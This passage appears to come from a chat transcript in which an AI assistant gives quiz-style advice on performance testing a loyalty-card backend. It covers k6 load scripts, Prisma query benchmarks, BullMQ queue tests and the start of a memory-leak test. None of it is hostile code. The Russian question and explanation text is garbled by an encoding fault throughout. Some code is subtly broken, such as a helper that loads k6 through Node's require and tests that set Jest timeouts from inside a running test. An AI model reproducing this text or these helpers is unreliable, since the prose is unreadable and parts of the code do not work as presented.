    console.log(`p99 latency: ${result.metrics.http_req_duration.p99}ms`);

    expect(result.metrics.http_req_failed.rate).toBeLessThan(0.01);
    expect(result.metrics.http_req_duration.p95).toBeLessThan(1000);
  });

  // Test 3: Peak Load (1000 users)
  it('should handle 1000 concurrent users (Black Friday)', async () => {
    const result = await runK6Script({
      stages: [
        { duration: '2m', target: 100 },  // Ramp-up to 100
        { duration: '3m', target: 1000 }, // Ramp-up to 1000
        { duration: '10m', target: 1000 }, // Sustain 1000
        { duration: '2m', target: 0 },    // Ramp-down
      ],
      script: userJourneyScript,
    });

    console.log('=== 1000 Concurrent Users (Black Friday) ===');
    console.log(`Total requests: ${result.metrics.http_reqs.count}`);
    console.log(`Failed: ${result.metrics.http_req_failed.count}`);
    console.log(`Failure rate: ${(result.metrics.http_req_failed.rate * 100).toFixed(2)}%`);
    console.log(`p95 latency: ${result.metrics.http_req_duration.p95}ms`);
    console.log(`p99 latency: ${result.metrics.http_req_duration.p99}ms`);

    expect(result.metrics.http_req_failed.rate).toBeLessThan(0.05); // < 5% failures
    expect(result.metrics.http_req_duration.p99).toBeLessThan(5000); // p99 < 5s
  });

  // Test 4: Stress Test (5000 users)
  it('should stress test with 5000 users', async () => {
    const result = await runK6Script({
      stages: [
        { duration: '5m', target: 1000 },  // Ramp to 1000
        { duration: '5m', target: 2500 },  // Ramp to 2500
        { duration: '5m', target: 5000 },  // Ramp to 5000
        { duration: '5m', target: 5000 },  // Sustain 5000
        { duration: '3m', target: 0 },     // Ramp-down
      ],
      script: userJourneyScript,
    });

    console.log('=== 5000 Concurrent Users (Stress Test) ===');
    console.log(`Total requests: ${result.metrics.http_reqs.count}`);
    console.log(`Failed: ${result.metrics.http_req_failed.count}`);
    console.log(`Failure rate: ${(result.metrics.http_req_failed.rate * 100).toFixed(2)}%`);
    console.log(`p95 latency: ${result.metrics.http_req_duration.p95}ms`);
    console.log(`p99 latency: ${result.metrics.http_req_duration.p99}ms`);

    // More lenient for stress test
    expect(result.metrics.http_req_failed.rate).toBeLessThan(0.10); // < 10% failures
  });
});

// K6 User Journey Script
const userJourneyScript = `
import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate } from 'k6/metrics';

const errorRate = new Rate('errors');

export default function() {
  const baseUrl = __ENV.BASE_URL || 'http://localhost:3000';
  const token = __ENV.JWT_TOKEN;

  // Step 1: Get balance
  let res = http.get(\`\${baseUrl}/api/v1/guest/balance\`, {
    headers: {
      'Authorization': \`Bearer \${token}\`,
    },
  });

  check(res, {
    'balance status is 200': (r) => r.status === 200,
    'balance has data': (r) => JSON.parse(r.body).balance !== undefined,
  }) || errorRate.add(1);

  sleep(1);

  // Step 2: Get transaction history
  res = http.get(\`\${baseUrl}/api/v1/guest/transactions?page=1&limit=10\`, {
    headers: {
      'Authorization': \`Bearer \${token}\`,
    },
  });

  check(res, {
    'transactions status is 200': (r) => r.status === 200,
    'transactions is array': (r) => Array.isArray(JSON.parse(r.body).data),
  }) || errorRate.add(1);

  sleep(2);

  // Step 3: Get QR code
  res = http.get(\`\${baseUrl}/api/v1/guest/qr-code\`, {
    headers: {
      'Authorization': \`Bearer \${token}\`,
    },
  });

  check(res, {
    'qr code status is 200': (r) => r.status === 200,
    'qr code has url': (r) => JSON.parse(r.body).qrCodeUrl !== undefined,
  }) || errorRate.add(1);

  sleep(3);

  // Step 4: Get active promos
  res = http.get(\`\${baseUrl}/api/v1/guest/promos/active\`, {
    headers: {
      'Authorization': \`Bearer \${token}\`,
    },
  });

  check(res, {
    'promos status is 200': (r) => r.status === 200,
  }) || errorRate.add(1);

  sleep(2);
}
`;

// Helper function to run K6
async function runK6Script(options: any): Promise<any> {
  const k6 = require('k6');
  const fs = require('fs');
  const path = require('path');

  // Write script to temp file
  const scriptPath = path.join(__dirname, 'temp-k6-script.js');
  fs.writeFileSync(scriptPath, userJourneyScript);

  // Run k6
  const result = await k6.run({
    script: scriptPath,
    vus: options.vus,
    duration: options.duration,
    stages: options.stages,
    thresholds: {
      http_req_failed: ['rate<0.1'], // < 10% failures
      http_req_duration: ['p(95)<2000'], // p95 < 2s
    },
  });

  // Cleanup
  fs.unlinkSync(scriptPath);

  return result;
}
```

**k6 CLI alternative:**

```javascript
// test/load/user-journey.k6.js
import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate, Trend } from 'k6/metrics';

// Custom metrics
const errorRate = new Rate('errors');
const userJourneyDuration = new Trend('user_journey_duration');

export const options = {
  stages: [
    { duration: '2m', target: 100 },   // Ramp-up
    { duration: '5m', target: 1000 },  // Peak
    { duration: '10m', target: 1000 }, // Sustain
    { duration: '2m', target: 0 },     // Ramp-down
  ],
  thresholds: {
    errors: ['rate<0.05'], // < 5% error rate
    http_req_duration: ['p(95)<1000', 'p(99)<3000'],
    user_journey_duration: ['p(95)<10000'], // User journey < 10s
  },
};

export default function() {
  const baseUrl = __ENV.BASE_URL;
  const startTime = Date.now();

  // Simulate user journey
  const token = generateGuestToken();

  // 1. View balance
  let res = http.get(`${baseUrl}/api/v1/guest/balance`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  check(res, { 'balance OK': (r) => r.status === 200 }) || errorRate.add(1);
  sleep(1);

  // 2. View history
  res = http.get(`${baseUrl}/api/v1/guest/transactions`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  check(res, { 'transactions OK': (r) => r.status === 200 }) || errorRate.add(1);
  sleep(2);

  // 3. View QR code
  res = http.get(`${baseUrl}/api/v1/guest/qr-code`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  check(res, { 'QR code OK': (r) => r.status === 200 }) || errorRate.add(1);
  sleep(1);

  // Record user journey duration
  userJourneyDuration.add(Date.now() - startTime);
}

function generateGuestToken() {
  // In real test, use pre-generated tokens from database
  return __ENV.JWT_TOKEN;
}
```

**Run command:**

```bash
k6 run --out json=results.json test/load/user-journey.k6.js
```


***

ะัะพะดะพะปะถะฐั ั ะฒะพะฟัะพัะฐะผะธ **23-30** (ะพััะฐะปัะฝัะต Load \& Performance)? ๐

---

# ะัะพะดะพะปะถะฐะน

ะัะพะดะพะปะถะฐั! ๐

***

### **23. Database Query Performance - slow queries?**

**ะะพะฝัะตะบัั:** `/guests` endpoint ะฒะพะทะฒัะฐัะฐะตั ัะฟะธัะพะบ ะธะท 10,000 ะณะพััะตะน.

**ะะพะฟัะพั:** Performance test?

- A) Query ั LIMIT 10 (pagination)
- B) Query ะฑะตะท LIMIT (full scan) - โ BAD
- C) A + ะฟัะพะฒะตัะธัั ััะพ query < 100ms
- D) C + ะฟัะพะฒะตัะธัั ััะพ indexes ะธัะฟะพะปัะทััััั (EXPLAIN ANALYZE)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Pagination ะพะฑัะทะฐัะตะปัะฝะฐ ะดะปั ะฑะพะปััะธั datasets
- Query < 100ms = ัะพัะพัะธะน UX
- EXPLAIN ANALYZE ะฟะพะบะฐะทัะฒะฐะตั index usage ะธ query plan

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/performance/database-queries.perf.spec.ts
describe('Database Query Performance', () => {
  let prisma: PrismaClient;

  beforeAll(async () => {
    prisma = new PrismaClient({
      datasources: { db: { url: process.env.TEST_DATABASE_URL } },
    });

    // Seed 10,000 guest cards
    console.log('Seeding 10,000 guest cards...');
    const batchSize = 1000;
    
    for (let i = 0; i < 10; i++) {
      const data = Array(batchSize).fill(null).map((_, j) => ({
        id: `card-${i * batchSize + j}`,
        userId: `user-${i * batchSize + j}`,
        tenantId: 'tenant-1',
        totalBalance: Math.floor(Math.random() * 5000),
        totalSpent: Math.floor(Math.random() * 50000),
        qrCode: `qr-${i * batchSize + j}`,
        displayCode: String(i * batchSize + j).padStart(6, '0'),
        status: 'ACTIVE',
        createdAt: new Date(Date.now() - Math.random() * 365 * 24 * 60 * 60 * 1000),
      }));

      await prisma.guestCard.createMany({ data });
    }
  });

  afterAll(async () => {
    await prisma.guestCard.deleteMany();
    await prisma.$disconnect();
  });

  // Test 1: Paginated Query Performance
  it('should fetch paginated guests < 100ms', async () => {
    const iterations = 10;
    const durations: number[] = [];

    for (let i = 0; i < iterations; i++) {
      const startTime = performance.now();

      await prisma.guestCard.findMany({
        where: { tenantId: 'tenant-1' },
        take: 10,
        skip: i * 10,
        orderBy: { createdAt: 'desc' },
      });

      const duration = performance.now() - startTime;
      durations.push(duration);
    }

    const avgDuration = durations.reduce((a, b) => a + b, 0) / durations.length;
    const maxDuration = Math.max(...durations);

    console.log('=== Paginated Query Performance ===');
    console.log(`Average: ${avgDuration.toFixed(2)}ms`);
    console.log(`Max: ${maxDuration.toFixed(2)}ms`);
    console.log(`Min: ${Math.min(...durations).toFixed(2)}ms`);

    expect(avgDuration).toBeLessThan(100); // < 100ms average
    expect(maxDuration).toBeLessThan(200); // < 200ms worst case
  });

  // Test 2: Full Scan (Anti-pattern)
  it('should demonstrate full scan is slow', async () => {
    const startTime = performance.now();

    await prisma.guestCard.findMany({
      where: { tenantId: 'tenant-1' },
      // NO LIMIT - BAD!
    });

    const duration = performance.now() - startTime;

    console.log('=== Full Scan (No Pagination) ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);

    // Full scan should be significantly slower
    expect(duration).toBeGreaterThan(500); // > 500ms (demonstrates problem)
  });

  // Test 3: EXPLAIN ANALYZE - Index Usage
  it('should use indexes for paginated queries', async () => {
    const explainResult = await prisma.$queryRawUnsafe<any[]>(`
      EXPLAIN ANALYZE
      SELECT * FROM "GuestCard"
      WHERE "tenantId" = 'tenant-1'
      ORDER BY "createdAt" DESC
      LIMIT 10 OFFSET 0;
    `);

    const queryPlan = explainResult.map(row => row['QUERY PLAN']).join('\n');
    console.log('=== Query Execution Plan ===');
    console.log(queryPlan);

    // Check that index is used
    expect(queryPlan).toContain('Index Scan'); // Using index
    expect(queryPlan).not.toContain('Seq Scan'); // NOT sequential scan

    // Extract execution time
    const executionTimeMatch = queryPlan.match(/Execution Time: ([\d.]+) ms/);
    if (executionTimeMatch) {
      const executionTime = parseFloat(executionTimeMatch[1]);
      console.log(`Execution time: ${executionTime}ms`);
      expect(executionTime).toBeLessThan(50); // < 50ms with index
    }
  });

  // Test 4: Filter Performance (with WHERE clause)
  it('should efficiently filter by status', async () => {
    const startTime = performance.now();

    const activeCards = await prisma.guestCard.findMany({
      where: {
        tenantId: 'tenant-1',
        status: 'ACTIVE',
      },
      take: 10,
      orderBy: { createdAt: 'desc' },
    });

    const duration = performance.now() - startTime;

    console.log('=== Filter Query Performance ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Results: ${activeCards.length}`);

    expect(duration).toBeLessThan(100);

    // Verify index usage
    const explainResult = await prisma.$queryRawUnsafe<any[]>(`
      EXPLAIN ANALYZE
      SELECT * FROM "GuestCard"
      WHERE "tenantId" = 'tenant-1' AND "status" = 'ACTIVE'
      ORDER BY "createdAt" DESC
      LIMIT 10;
    `);

    const queryPlan = explainResult.map(row => row['QUERY PLAN']).join('\n');
    expect(queryPlan).toContain('Index');
  });

  // Test 5: Search Query Performance (LIKE)
  it('should efficiently search guests by phone', async () => {
    // Add users with phones
    await prisma.user.createMany({
      data: Array(1000).fill(null).map((_, i) => ({
        id: `user-search-${i}`,
        phone: `+7999${String(i).padStart(7, '0')}`,
        role: 'GUEST',
        phoneVerified: true,
      })),
    });

    const startTime = performance.now();

    const results = await prisma.user.findMany({
      where: {
        phone: { startsWith: '+79991' },
      },
      take: 10,
    });

    const duration = performance.now() - startTime;

    console.log('=== Search Query Performance ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Results: ${results.length}`);

    expect(duration).toBeLessThan(100);

    // Check for trigram index (for LIKE queries)
    const explainResult = await prisma.$queryRawUnsafe<any[]>(`
      EXPLAIN ANALYZE
      SELECT * FROM "User"
      WHERE "phone" LIKE '+79991%'
      LIMIT 10;
    `);

    const queryPlan = explainResult.map(row => row['QUERY PLAN']).join('\n');
    console.log(queryPlan);

    // Should use index (not seq scan)
    expect(queryPlan.toLowerCase()).not.toContain('seq scan on "user"');
  });

  // Test 6: JOIN Performance
  it('should efficiently join GuestCard with User', async () => {
    const startTime = performance.now();

    const guestsWithUsers = await prisma.guestCard.findMany({
      where: { tenantId: 'tenant-1' },
      take: 10,
      include: {
        user: {
          select: {
            phone: true,
            guestProfile: {
              select: {
                firstName: true,
                lastName: true,
              },
            },
          },
        },
      },
      orderBy: { createdAt: 'desc' },
    });

    const duration = performance.now() - startTime;

    console.log('=== JOIN Query Performance ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Results: ${guestsWithUsers.length}`);

    expect(duration).toBeLessThan(150); // JOINs slightly slower

    // Check query plan
    const explainResult = await prisma.$queryRawUnsafe<any[]>(`
      EXPLAIN ANALYZE
      SELECT gc.*, u.phone, gp."firstName", gp."lastName"
      FROM "GuestCard" gc
      LEFT JOIN "User" u ON gc."userId" = u.id
      LEFT JOIN "GuestProfile" gp ON u.id = gp."userId"
      WHERE gc."tenantId" = 'tenant-1'
      ORDER BY gc."createdAt" DESC
      LIMIT 10;
    `);

    const queryPlan = explainResult.map(row => row['QUERY PLAN']).join('\n');
    console.log(queryPlan);

    // Should use index joins (not hash/merge join on large datasets)
    expect(queryPlan).toContain('Nested Loop'); // Efficient for small LIMIT
  });

  // Test 7: Aggregation Performance
  it('should efficiently aggregate guest statistics', async () => {
    const startTime = performance.now();

    const stats = await prisma.guestCard.aggregate({
      where: { tenantId: 'tenant-1' },
      _sum: { totalBalance: true, totalSpent: true },
      _avg: { totalBalance: true },
      _count: true,
    });

    const duration = performance.now() - startTime;

    console.log('=== Aggregation Query Performance ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Stats:`, stats);

    expect(duration).toBeLessThan(500); // Aggregations can be slower

    // For production: use materialized views
    const mvResult = await prisma.$queryRaw<any[]>`
      SELECT 
        COUNT(*) as total_guests,
        SUM("totalBalance") as total_balance,
        AVG("totalBalance") as avg_balance
      FROM "GuestCard"
      WHERE "tenantId" = 'tenant-1';
    `;

    console.log('Materialized view result:', mvResult[0]);
  });

  // Test 8: N+1 Query Problem
  it('should avoid N+1 queries with proper includes', async () => {
    // BAD: N+1 queries
    const startTimeN1 = performance.now();
    
    const guestCards = await prisma.guestCard.findMany({
      where: { tenantId: 'tenant-1' },
      take: 10,
    });

    // N+1: fetch user for each card
    for (const card of guestCards) {
      await prisma.user.findUnique({ where: { id: card.userId } });
    }

    const durationN1 = performance.now() - startTimeN1;

    // GOOD: Single query with include
    const startTimeInclude = performance.now();
    
    await prisma.guestCard.findMany({
      where: { tenantId: 'tenant-1' },
      take: 10,
      include: { user: true },
    });

    const durationInclude = performance.now() - startTimeInclude;

    console.log('=== N+1 Query Comparison ===');
    console.log(`N+1 queries: ${durationN1.toFixed(2)}ms`);
    console.log(`Include: ${durationInclude.toFixed(2)}ms`);
    console.log(`Speedup: ${(durationN1 / durationInclude).toFixed(2)}x`);

    expect(durationInclude).toBeLessThan(durationN1 * 0.5); // At least 2x faster
  });

  // Test 9: Index Recommendations
  it('should generate index recommendations', async () => {
    // Enable pg_stat_statements extension
    await prisma.$executeRaw`CREATE EXTENSION IF NOT EXISTS pg_stat_statements;`;

    // Run some queries
    await prisma.guestCard.findMany({
      where: { tenantId: 'tenant-1', status: 'ACTIVE' },
      orderBy: { totalSpent: 'desc' },
      take: 10,
    });

    // Get slow queries
    const slowQueries = await prisma.$queryRaw<any[]>`
      SELECT
        query,
        calls,
        mean_exec_time,
        max_exec_time
      FROM pg_stat_statements
      WHERE query LIKE '%GuestCard%'
        AND mean_exec_time > 100
      ORDER BY mean_exec_time DESC
      LIMIT 10;
    `;

    console.log('=== Slow Queries (> 100ms) ===');
    console.table(slowQueries);

    // Generate index recommendations
    // Based on slow queries, suggest indexes
    const recommendations = analyzeSlowQueries(slowQueries);
    console.log('=== Index Recommendations ===');
    console.table(recommendations);
  });
});

// Helper function
function analyzeSlowQueries(queries: any[]): any[] {
  const recommendations: any[] = [];

  for (const query of queries) {
    if (query.query.includes('WHERE') && query.query.includes('ORDER BY')) {
      // Suggest composite index
      recommendations.push({
        table: 'GuestCard',
        index: 'CREATE INDEX idx_guest_card_tenant_status_spent ON "GuestCard" ("tenantId", "status", "totalSpent")',
        reason: 'Covers WHERE and ORDER BY clauses',
        expectedSpeedup: '5-10x',
      });
    }
  }

  return recommendations;
}
```


***

### **24. Background Job Processing - queue saturation?**

**ะะพะฝัะตะบัั:** BullMQ queue = 10,000 notifications ะฒ ะพัะตัะตะดะธ.

**ะะพะฟัะพั:** Load test?

- A) Add 100 jobs โ ะฟัะพะฒะตัะธัั ััะพ ะพะฑัะฐะฑะพัะฐะฝั
- B) Add 10,000 jobs โ ะฟัะพะฒะตัะธัั throughput
- C) B + ะฟัะพะฒะตัะธัั ััะพ workers ะฝะต ะฟะฐะดะฐัั (OOM)
- D) C + ะฟัะพะฒะตัะธัั latency (ะฒัะตะผั ะพั enqueue ะดะพ complete)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Queue saturation = ัะตะฐะปัะฝะฐั ะฟัะพะฑะปะตะผะฐ ะฟัะธ burst traffic
- Worker stability ะบัะธัะธัะตะฝ (OOM = queue stops)
- Latency ะฟะพะบะฐะทัะฒะฐะตั real user impact

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/performance/queue-processing.perf.spec.ts
import { Queue, Worker, QueueEvents } from 'bullmq';
import { Redis } from 'ioredis';

describe('Background Job Processing - Queue Performance', () => {
  let queue: Queue;
  let worker: Worker;
  let queueEvents: QueueEvents;
  let redis: Redis;

  beforeAll(async () => {
    redis = new Redis({
      host: process.env.REDIS_HOST || 'localhost',
      port: parseInt(process.env.REDIS_PORT || '6379'),
    });

    queue = new Queue('test-notifications', {
      connection: redis,
    });

    // Start worker
    worker = new Worker(
      'test-notifications',
      async (job) => {
        // Simulate notification processing
        await new Promise(resolve => setTimeout(resolve, 50)); // 50ms per job
        return { success: true };
      },
      {
        connection: redis,
        concurrency: 10, // 10 concurrent jobs
      }
    );

    queueEvents = new QueueEvents('test-notifications', {
      connection: redis,
    });
  });

  afterAll(async () => {
    await worker.close();
    await queue.close();
    await queueEvents.close();
    await redis.quit();
  });

  beforeEach(async () => {
    await queue.obliterate(); // Clear queue
  });

  // Test 1: Small Batch (100 jobs)
  it('should process 100 jobs efficiently', async () => {
    jest.setTimeout(30000);

    const startTime = Date.now();
    const jobIds: string[] = [];

    // Add 100 jobs
    for (let i = 0; i < 100; i++) {
      const job = await queue.add('send-notification', {
        guestId: `user-${i}`,
        message: `Test notification ${i}`,
      });
      jobIds.push(job.id);
    }

    console.log('Enqueued 100 jobs');

    // Wait for all jobs to complete
    await Promise.all(jobIds.map(id => 
      queueEvents.waitUntilFinished(id)
    ));

    const duration = Date.now() - startTime;
    const throughput = (100 / duration) * 1000; // jobs/sec

    console.log('=== 100 Jobs Performance ===');
    console.log(`Duration: ${duration}ms`);
    console.log(`Throughput: ${throughput.toFixed(2)} jobs/sec`);

    expect(duration).toBeLessThan(10000); // < 10 seconds
    expect(throughput).toBeGreaterThan(10); // > 10 jobs/sec
  });

  // Test 2: Large Batch (10,000 jobs)
  it('should handle 10,000 jobs without saturation', async () => {
    jest.setTimeout(300000); // 5 minutes

    const startTime = Date.now();
    const batchSize = 1000;
    let totalEnqueued = 0;

    console.log('Enqueueing 10,000 jobs...');

    // Add jobs in batches
    for (let batch = 0; batch < 10; batch++) {
      const jobs = Array(batchSize).fill(null).map((_, i) => ({
        name: 'send-notification',
        data: {
          guestId: `user-${batch * batchSize + i}`,
          message: `Test notification ${batch * batchSize + i}`,
        },
      }));

      await queue.addBulk(jobs);
      totalEnqueued += batchSize;

      console.log(`Enqueued: ${totalEnqueued}/10,000`);
    }

    const enqueueTime = Date.now() - startTime;
    console.log(`Enqueue time: ${enqueueTime}ms`);

    // Monitor queue metrics
    const checkInterval = setInterval(async () => {
      const counts = await queue.getJobCounts('wait', 'active', 'completed', 'failed');
      console.log(`Queue status:`, counts);
    }, 5000);

    // Wait for all jobs to complete
    const processingStart = Date.now();
    
    while (true) {
      const counts = await queue.getJobCounts('completed', 'failed');
      const total = counts.completed + counts.failed;
      
      if (total >= 10000) {
        break;
      }
      
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    clearInterval(checkInterval);

    const processingTime = Date.now() - processingStart;
    const totalTime = Date.now() - startTime;
    const throughput = (10000 / processingTime) * 1000;

    console.log('=== 10,000 Jobs Performance ===');
    console.log(`Enqueue time: ${enqueueTime}ms`);
    console.log(`Processing time: ${processingTime}ms`);
    console.log(`Total time: ${totalTime}ms`);
    console.log(`Throughput: ${throughput.toFixed(2)} jobs/sec`);

    const counts = await queue.getJobCounts('completed', 'failed');
    console.log(`Completed: ${counts.completed}`);
    console.log(`Failed: ${counts.failed}`);

    expect(counts.completed).toBeGreaterThan(9500); // > 95% success rate
    expect(throughput).toBeGreaterThan(50); // > 50 jobs/sec
  });

  // Test 3: Worker Memory Stability
  it('should not leak memory during processing', async () => {
    jest.setTimeout(120000);

    const initialMemory = process.memoryUsage().heapUsed;
    const memorySnapshots: number[] = [];

    // Add 5,000 jobs
    console.log('Adding 5,000 jobs...');
    const jobs = Array(5000).fill(null).map((_, i) => ({
      name: 'send-notification',
      data: { guestId: `user-${i}`, message: `Test ${i}` },
    }));
    await queue.addBulk(jobs);

    // Monitor memory every 5 seconds
    const memoryMonitor = setInterval(() => {
      const currentMemory = process.memoryUsage().heapUsed;
      const memoryMB = currentMemory / 1024 / 1024;
      memorySnapshots.push(memoryMB);
      console.log(`Memory: ${memoryMB.toFixed(2)} MB`);
    }, 5000);

    // Wait for completion
    while (true) {
      const counts = await queue.getJobCounts('completed', 'failed');
      if (counts.completed + counts.failed >= 5000) break;
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    clearInterval(memoryMonitor);

    const finalMemory = process.memoryUsage().heapUsed;
    const memoryIncrease = (finalMemory - initialMemory) / 1024 / 1024;

    console.log('=== Memory Analysis ===');
    console.log(`Initial: ${(initialMemory / 1024 / 1024).toFixed(2)} MB`);
    console.log(`Final: ${(finalMemory / 1024 / 1024).toFixed(2)} MB`);
    console.log(`Increase: ${memoryIncrease.toFixed(2)} MB`);
    console.log(`Peak: ${Math.max(...memorySnapshots).toFixed(2)} MB`);

    // Memory should not increase by more than 200MB
    expect(memoryIncrease).toBeLessThan(200);
  });

  // Test 4: Job Latency Distribution
  it('should measure job latency (enqueue to complete)', async () => {
    jest.setTimeout(60000);

    const latencies: number[] = [];
    const jobCount = 1000;

    // Track when each job was enqueued
    const enqueueTimes = new Map<string, number>();

    // Add jobs
    for (let i = 0; i < jobCount; i++) {
      const job = await queue.add('send-notification', {
        guestId: `user-${i}`,
        message: `Test ${i}`,
      });
      enqueueTimes.set(job.id, Date.now());
    }

    // Listen for completed jobs
    queueEvents.on('completed', ({ jobId }) => {
      const enqueueTime = enqueueTimes.get(jobId);
      if (enqueueTime) {
        const latency = Date.now() - enqueueTime;
        latencies.push(latency);
      }
    });

    // Wait for all jobs
    await new Promise(resolve => {
      const interval = setInterval(async () => {
        if (latencies.length >= jobCount) {
          clearInterval(interval);
          resolve(null);
        }
      }, 1000);
    });

    // Calculate percentiles
    latencies.sort((a, b) => a - b);
    const p50 = latencies[Math.floor(latencies.length * 0.5)];
    const p95 = latencies[Math.floor(latencies.length * 0.95)];
    const p99 = latencies[Math.floor(latencies.length * 0.99)];
    const max = latencies[latencies.length - 1];
    const avg = latencies.reduce((a, b) => a + b, 0) / latencies.length;

    console.log('=== Job Latency Distribution ===');
    console.log(`Average: ${avg.toFixed(2)}ms`);
    console.log(`p50: ${p50}ms`);
    console.log(`p95: ${p95}ms`);
    console.log(`p99: ${p99}ms`);
    console.log(`Max: ${max}ms`);

    expect(p95).toBeLessThan(1000); // p95 < 1s
    expect(p99).toBeLessThan(3000); // p99 < 3s
  });

  // Test 5: Failed Job Retry
  it('should handle job failures with retries', async () => {
    jest.setTimeout(60000);

    let attempts = 0;

    // Create worker that fails first 2 attempts
    const failingWorker = new Worker(
      'test-notifications',
      async (job) => {
        attempts++;
        if (attempts <= 2) {
          throw new Error('Temporary failure');
        }
        return { success: true };
      },
      {
        connection: redis,
        concurrency: 1,
      }
    );

    // Add job with retries
    const job = await queue.add(
      'send-notification',
      { guestId: 'user-1', message: 'Test' },
      { attempts: 3, backoff: { type: 'exponential', delay: 1000 } }
    );

    // Wait for completion
    await queueEvents.waitUntilFinished(job.id);

    const finalJob = await queue.getJob(job.id);
    console.log('=== Job Retry Test ===');
    console.log(`Attempts: ${finalJob.attemptsMade}`);
    console.log(`Status: ${await finalJob.getState()}`);

    expect(finalJob.attemptsMade).toBe(3);
    expect(await finalJob.getState()).toBe('completed');

    await failingWorker.close();
  });

  // Test 6: Priority Queue
  it('should process high priority jobs first', async () => {
    jest.setTimeout(30000);

    const processOrder: string[] = [];

    const priorityWorker = new Worker(
      'test-notifications',
      async (job) => {
        processOrder.push(job.data.priority);
        await new Promise(resolve => setTimeout(resolve, 100));
        return { success: true };
      },
      { connection: redis, concurrency: 1 }
    );

    // Add jobs with different priorities
    await queue.add('send-notification', { priority: 'LOW' }, { priority: 10 });
    await queue.add('send-notification', { priority: 'HIGH' }, { priority: 1 });
    await queue.add('send-notification', { priority: 'NORMAL' }, { priority: 5 });
    await queue.add('send-notification', { priority: 'CRITICAL' }, { priority: 0 });

    // Wait for processing
    await new Promise(resolve => setTimeout(resolve, 5000));

    console.log('=== Priority Queue Test ===');
    console.log(`Process order: ${processOrder.join(' โ ')}`);

    expect(processOrder[0]).toBe('CRITICAL'); // Highest priority first
    expect(processOrder[1]).toBe('HIGH');
    expect(processOrder[2]).toBe('NORMAL');
    expect(processOrder[3]).toBe('LOW');

    await priorityWorker.close();
  });
});
```


***

### **25. Memory Leak Detection - production memory usage?**

**ะะพะฝัะตะบัั:** ะะพัะปะต 24 hours ะฒ production memory usage = 2GB (was 500MB).

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั?

- A) Manual monitoring ะฒ production
- B) Load test: run 10,000 requests โ check memory
- C) B + soak test (24 hours continuous load)
- D) C + automated heap dump analysis (Chrome DevTools)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Memory leaks = silent killers (production crashes ะฟะพัะปะต ะดะฝะตะน ัะฐะฑะพัั)
- Soak test (24h) ะฝะฐัะพะดะธั leaks ะบะพัะพััะต ะฝะต ะฒะธะดะฝั ะฒ short tests
- Heap dump analysis ัะพัะฝะพ ะฟะพะบะฐะทัะฒะฐะตั ััะพ leaks

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/performance/memory-leak.perf.spec.ts
import v8 from 'v8';
import { writeHeapSnapshot } from 'v8';
import fs from 'fs';
import path from 'path';

describe('Memory Leak Detection', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Baseline Memory Usage
  it('should measure baseline memory usage', async () => {
    // Force garbage collection
    if (global.gc) {
      global.gc();
    }

    await new Promise(resolve => setTimeout(resolve, 1000));

    const baseline = process.memoryUsage();
    
    console.log('=== Baseline Memory ===');
    console.log(`Heap Used: ${(baseline.heapUsed / 1024 / 1024).toFixed(2)} MB`);
    console.log(`Heap Total: ${(baseline.heapTotal / 1024 / 1024).toFixed(2)} MB`);
    console.log(`RSS: ${(baseline.rss / 1024 / 1024).toFixed(2)} MB`);
    console.log(`External: ${(baseline.external / 1024 / 1024).toFixed(2)} MB`);

    // Baseline should be reasonable
    expect(baseline.heapUsed / 1024 / 1024).toBeLessThan(200); // < 200MB
  });

  // Test 2: Memory Growth During Load
  it('should detect memory leaks during load test', async () => {
    jest.setTimeout(300000); // 5 minutes

    const measurements: Array<{ iteration: number; heapUsed: number; timestamp: number }> = [];

    // Force GC before test
    if (global.gc) global.gc();
    await new Promise(resolve => setTimeout(resolve, 1000));

    const initialMemory = process.memoryUsage().heapUsed;

    // Run 10,000 requests
    for (let i = 0; i < 10000; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/health')
        .expect(200);

      // Measure memory every 1000 requests
      if (i % 1000 === 0) {
        if (global.gc) global.gc();
        await new Promise(resolve => setTimeout(resolve, 100));

        const currentMemory = process.memoryUsage().heapUsed;
        measurements.push({
          iteration: i,
          heapUsed: currentMemory / 1024 / 1024,
          timestamp: Date.now(),
        });

        console.log(`Iteration ${i}: ${(currentMemory / 1024 / 1024).toFixed(2)} MB`);
      }
    }

    const finalMemory = process.memoryUsage().heapUsed;
    const growth = (finalMemory - initialMemory) / 1024 / 1024;

    console.log('=== Memory Growth Analysis ===');
    console.log(`Initial: ${(initialMemory / 1024 / 1024).toFixed(2)} MB`);
    console.log(`Final: ${(finalMemory / 1024 / 1024).toFixed(2)} MB`);
    console.log(`Growth: ${growth.toFixed(2)} MB`);

    // Analyze trend
    const growthRate = calculateGrowthRate(measurements);
    console.log(`Growth rate: ${growthRate.toFixed(4)} MB/iteration`);

    // Memory should not grow significantly
    expect(growth).toBeLessThan(100); // < 100MB growth

    // Growth rate should be near zero (no leak)
    expect(Math.abs(growthRate)).toBeLessThan(0.01);
  });

  // Test 3: Soak Test (long-running)
  it('should detect leaks in 1-hour soak test', async () => {
    jest.setTimeout(3660000); // 61 minutes

    const measurements: any[] = [];
    const startTime = Date.now();
    const duration = 60 * 60 * 1000; // 1 hour

    console.log('Starting 1-hour soak test...');

    // Take heap snapshot before
    const snapshotBefore = path.join(__dirname, 'heap-before.heapsnapshot');
